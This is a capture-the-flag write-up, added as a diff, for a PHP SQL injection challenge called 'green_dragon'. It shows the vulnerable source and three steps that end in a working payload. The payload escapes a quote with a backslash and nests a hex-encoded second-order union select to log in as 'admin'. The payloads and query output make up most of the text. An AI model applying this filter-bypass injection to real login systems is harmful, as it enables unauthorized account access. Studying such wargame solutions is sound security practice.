@@ -1,0 +1,49 @@
+Problem
+-------
+
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
+  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['id']){
+    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
+    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
+    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
+    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
+    $result = mysqli_fetch_array(mysqli_query($db,$query2));
+    if($result['id'] == "admin") solve("green_dragon");
+  }
+  highlight_file(__FILE__);
+?>
+
+Step 1
+------
+
+query : select id,pw from prob_green_dragon where id='\' and pw='||id=0x61646d696e#'
+
+No reaction (query2)... Seems like there is no value in the table.
+
+
+Step 2
+------
+
+query : select id,pw from prob_green_dragon where id='\' and pw=' union select 1,2#'
+
+Ok, query2 appeared on stdout:
+
+query2 : select id from prob_green_dragon where id='1' and pw='2'
+
+
+Step 3
+------
+
+The payload: ?id=\&pw= union select 0x5c,0x756E696F6E2073656C6563742030783631363436643639366523%23
+
+query : select id,pw from prob_green_dragon where id='\' and pw=' union select 0x5c,0x756E696F6E2073656C6563742030783631363436643639366523#'
+query2 : select id from prob_green_dragon where id='\' and pw='union select 0x61646d696e#'
+
